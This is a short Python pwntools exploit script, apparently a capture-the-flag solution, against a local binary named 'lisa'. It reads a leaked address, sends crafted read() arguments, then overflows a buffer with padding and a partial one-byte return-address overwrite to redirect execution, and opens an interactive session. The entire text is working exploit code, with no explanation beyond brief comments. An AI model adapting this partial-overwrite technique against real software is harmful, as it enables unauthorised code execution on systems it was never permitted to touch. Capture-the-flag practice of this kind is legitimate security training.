from pwn import *

r = process('./lisa')
r.recvuntil(': ')
share = int(r.recvline(), 16)
log.success(hex(share))
r.recvuntil('.\n')

payload = ''
payload += p32(0)       # fd
payload += p32(share)   # buf
payload += p32(1)       # nbytes
r.send(payload)
r.recvline()

payload = ''
payload += '\0' * 0x1C
payload += '\x15'       # 0x56???D15 (main+0xD5)
r.send(payload)

r.send('\0')
r.interactive()
